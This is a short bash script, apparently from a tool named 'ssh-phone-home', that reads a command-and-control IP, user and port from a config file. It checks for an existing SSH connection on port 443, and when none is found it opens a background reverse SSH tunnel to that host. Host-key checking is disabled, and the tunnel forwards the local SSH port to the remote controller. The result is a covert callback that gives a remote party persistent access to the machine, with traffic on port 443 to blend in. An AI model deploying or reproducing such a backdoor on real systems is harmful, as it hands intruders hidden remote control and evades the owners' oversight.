#!/bin/bash

cd /opt/ssh-phone-home

# Import the configuration variables
CNC_IP=$(grep "CNC_IP" config | cut -d '=' -f 2)
DBUSER=$(grep "DBUSER" config | cut -d '=' -f 2)
DBPORT=$(grep "DBPORT" config | cut -d '=' -f 2)

if netstat -antp|grep ":443.\+ESTABLISHED.\+/ssh" ; then 
    echo "CNC Connection is UP"
else
    echo "CNC Connection is DOWN"

    ## Connect to the C&C ##
    echo Connecting...
    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p 443 -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 &
fi
